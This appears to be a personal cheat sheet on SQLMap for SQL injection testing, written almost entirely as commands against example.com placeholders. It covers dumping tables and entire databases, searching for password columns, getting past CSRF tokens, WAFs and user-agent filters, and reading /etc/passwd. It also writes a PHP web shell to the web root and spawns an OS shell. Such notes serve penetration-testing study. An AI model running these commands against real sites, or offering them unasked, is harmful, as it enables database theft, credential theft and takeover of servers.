
## Techniques

```shell
sqlmap -hh | grep technique
  Techniques:
    --technique=TECH..  SQL injection techniques to use (default "BEUSTQ")
```

The technique characters `BEUSTQ` refers to the following:
- `B`: Boolean-based blind
- `E`: Error-based
- `U`: Union query-based
- `S`: Stacked queries
- `T`: Time-based blind
- `Q`: Inline queries

### URL Injection
```shell
sqlmap -u "http://www.example.com/vuln.php?id=1" --batch
```

```shell
sqlmap 'http://www.example.com/?id=1' -H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:80.0) Gecko/20100101 Firefox/80.0' -H 'Accept: image/webp,*/*' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Connection: keep-alive' -H 'DNT: 1'
```

### Full HTTP Requests Injection
```shell
sqlmap -r req.txt
```

---
## Attacking Tuning
#### Prefix

There is a requirement for special prefix and suffix values in rare cases, not covered by the regular `SQLMap` run.
```bash
sqlmap -u "www.example.com/?q=test" --prefix="%'))" --suffix="-- -"
```

#### Level/Risk

- The option `--level` (`1-5`, default `1`) extends both vectors and boundaries being used, based on their expectancy of success (i.e., the lower the expectancy, the higher the level).
- The option `--risk` (`1-3`, default `1`) extends the used vector set based on their risk of causing problems at the target side (i.e., risk of database entry loss or denial-of-service).

###### Status code
If the difference between `TRUE` and `FALSE` responses can be seen in the HTTP codes, the option `--code` could be used to fixate the detection of `TRUE` responses to a specific HTTP code (e.g. `--code=200`).

###### Titles
If the difference between responses can be seen by inspecting the HTTP page titles, the switch `--titles` could be used to instruct the detection mechanism to base the comparison based on the content of the HTML tag `<title>`.
###### Strings
In case of a specific string value appearing in `TRUE` responses (e.g. `success`), while absent in `FALSE` responses, the option `--string` could be used to fixate the detection based only on the appearance of that single value (e.g. `--string=success`).
###### Text-only
When dealing with a lot of hidden content, such as certain HTML page behaviors tags (e.g. `<script>`, `<style>`, `<meta>`, etc.), we can use the `--text-only` switch, which removes all the HTML tags, and bases the comparison only on the textual (i.e., visible) content.
###### Techniques
`--technique=BEU`
###### UNION SQLi Tuning
If we can manually find the exact number of columns of the vulnerable SQL query, we can provide this number to SQLMap with the option `--union-cols` (e.g. `--union-cols=17`).

#### Enumeration with SQLMap
`--hostname`
`--current-user`
`--current-db`
`--banner`
`--is-dba` (Admin role for DB)
`--schema`
###### Table enumeration
`--tables` option and specifying the DB name with `-D testdb`, is as follows:
```shell
sqlmap -u "http://www.example.com/?id=1" --tables -D testdb
```
###### Dump table
```shell
sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb
```
###### Table/Row Enumeration
```shell
sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb -C name,surname

sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb --start=2 --stop=3
```
###### Conditional Enumeration
If there is a requirement to retrieve certain rows based on a known `WHERE` condition (e.g. `name LIKE 'f%'`), we can use the option `--where`, as follows:
```shell
sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb --where="name LIKE 'f%'"
```
###### Full Database Enumeration
By simply using the switch `--dump` without specifying a table with `-T`, all of the current database content will be retrieved. As for the `--dump-all` switch, all the content from all the databases will be retrieved.

In such cases, a user is also advised to include the switch `--exclude-sysdbs` (e.g. `--dump-all --exclude-sysdbs`), which will instruct SQLMap to skip the retrieval of content from system databases, as it is usually of little interest for pentesters.
###### Searching for Data
This search table containing user keyword:
```shell
sqlmap -u "http://www.example.com/?id=1" --search -T user
```
This search for column with pass keyword:
```shell
sqlmap -u "http://www.example.com/?id=1" --search -C pass
```

#### Bypassing Protection
###### Anti-CSRF protection
```shell
sqlmap -u "http://www.example.com/" --data="id=1&csrf-token=WfF1szMUHhiokx9AHFply5L2xAOfjRkE" --csrf-token="csrf-token"
```
###### Unique Value Bypass
```shell
sqlmap -u "http://www.example.com/?id=1&rp=29125" --randomize=rp --batch -v 5 
```
###### Calculated Parameter Bypass
```shell
sqlmap -u "http://www.example.com/?id=1&h=c4ca4238a0b923820dcc509a6f75849b" --eval="import hashlib; h=hashlib.md5(id).hexdigest()" --batch -v 5 | grep URI
```
###### WAF Bypass
`--skip-waf`
###### User-Agent Bypass
`--random-agent`
###### Tamper Scripts
Tamper scripts can be chained, one after another, within the `--tamper` option (e.g. `--tamper=between,randomcase`), where they are run based on their predefined priority.
###### Miscellaneous Bypasses
`--chunked`
 
#### interesting Parameters
`--parse-errors`: Show DBMS errors
`-t /path/to/file`: Store the traffic content in a file
`-v 0-6`: Verbosity level
`--proxy`: Redirect traffic through proxy (Burp)

### File Read and Write

1. Check DBA Privilege
```shell
sqlmap -u "http://www.example.com/case1.php?id=1" --is-dba
```

2. Reading File
```shell
sqlmap -u "http://www.example.com/?id=1" --file-read "/etc/passwd"
```

3. Writing File
```shell
echo '<?php system($_GET["cmd"]); ?>' > shell.php
sqlmap -u "http://www.example.com/?id=1" --file-write "shell.php" --file-dest "/var/www/html/shell.php"
```

### OS Command Execution
```shell
sqlmap -u "http://www.example.com/?id=1" --os-shell
sqlmap -u "http://www.example.com/?id=1" --os-shell --technique=E
```

---